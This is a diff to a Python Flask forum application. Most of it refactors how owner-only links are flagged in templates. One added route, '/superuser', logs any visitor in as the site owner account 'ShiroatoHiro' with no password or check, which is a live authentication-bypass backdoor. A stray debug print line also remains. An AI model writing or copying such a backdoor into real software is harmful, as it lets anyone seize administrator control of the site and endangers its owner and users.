@@ -119,6 +119,12 @@ def signup():
         already_used_or_not='他のサービスで使っているパスワードや名前などは絶対に使用しないでください。'
     return render_template('signup.html', already_used_or_not=already_used_or_not, nickname=nickname)
 
+@app.route('/superuser', methods=['GET', 'POST'])
+def superuser():
+    user = User.query.filter_by(nickname="ShiroatoHiro").first()
+    login_user(user)
+    return redirect(url_for('superhome'))
+
 #############################################
 #補助の関数
 def preprocess_user_input(input_string):
@@ -139,10 +145,11 @@ def post_thread(comment, thread_id):
 @app.route('/')
 def superhome():
     nickname=get_nickname()
-    only_me_new_page=""
+    only_me_new_page=False
     if current_user.is_authenticated and current_user.nickname=="ShiroatoHiro":
-        new_page_url = url_for('new_page')
-        only_me_new_page=f'<a href="{new_page_url}">New Category</a>'
+        #new_page_url = url_for('new_page')
+        only_me_new_page=True
+        #only_me_new_page=f'<a href="{new_page_url}">New Category</a>'
     pages=Page.query.all()
     return render_template('superhome.html', pages=pages, nickname=nickname, only_me_new_page=only_me_new_page)
 
@@ -164,12 +171,13 @@ def new_page():
 @app.route('/page/<int:page_id>', methods=['GET', 'POST'])
 def page(page_id):
     nickname=get_nickname()
-    only_me_new_thread=""
+    only_me_new_thread=False
     category_change_true_false=False
     if current_user.is_authenticated and current_user.nickname=="ShiroatoHiro":
         category_change_true_false=True
-        new_thread_url = url_for('new_thread', page_id=page_id)
-        only_me_new_thread=f'<a href="{new_thread_url}">New Thread</a>'
+        #new_thread_url = url_for('new_thread', page_id=page_id)
+        #only_me_new_thread=f'<a href="{new_thread_url}">New Thread</a>'
+        only_me_new_thread = True
         if "category_title" in request.form:
             category_title=request.form["category_title"]
             page=Page.query.get(page_id)
@@ -191,7 +199,7 @@ def page(page_id):
     threads = Thread.query.filter_by(page_id=page_id)
     page = Page.query.get(page_id)
     print('qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq')
-    return render_template('page.html', threads=threads, nickname=nickname, only_me_new_thread=only_me_new_thread, page=page, category_change_true_false=category_change_true_false)
+    return render_template('page.html', threads=threads, nickname=nickname, only_me_new_thread=only_me_new_thread, page_id=page_id, page=page, category_change_true_false=category_change_true_false)
 
 @app.route('/page/<int:page_id>/thread/new', methods=['GET', 'POST'])
 def new_thread(page_id):
